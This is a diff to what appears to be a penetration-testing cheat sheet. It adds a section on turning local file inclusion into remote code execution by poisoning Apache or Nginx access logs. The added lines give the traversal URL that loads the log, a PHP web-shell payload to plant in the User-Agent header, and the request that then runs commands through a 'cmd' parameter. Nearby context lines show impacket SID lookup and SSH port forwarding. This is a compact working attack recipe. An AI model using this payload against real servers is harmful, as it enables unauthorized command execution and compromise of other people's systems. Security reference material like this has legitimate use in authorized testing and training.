@@ -99,4 +99,22 @@ lookipsid.py domain/user:password@10.10.10.10
 ```
     ssh -L port_to_host:ip_address:port_to_forward user@host.com
 ```
+## Local File Inclusion (LFI) / Directory Traversal
+
+### RCE Through Apache / Nginx Log Files
+
+Nginx log files are readable by www-data user by default  
+Apache log files are readable by root and adm users (older versions are readable by all users)  
+
+#### Poisoning User-Agent
+
+*Example*  
+
+Once LFI exists in the target system, send a request to  
+
+`http://example.com/index.php?language=/var/log/apache2/access.log`
+
+Change the User-Agent to `<?php system($_GET['cmd']); ?>`
+
+Inject commands via `http://example.com/index.php?language=/var/log/apache2/access.log&cmd=id`
 
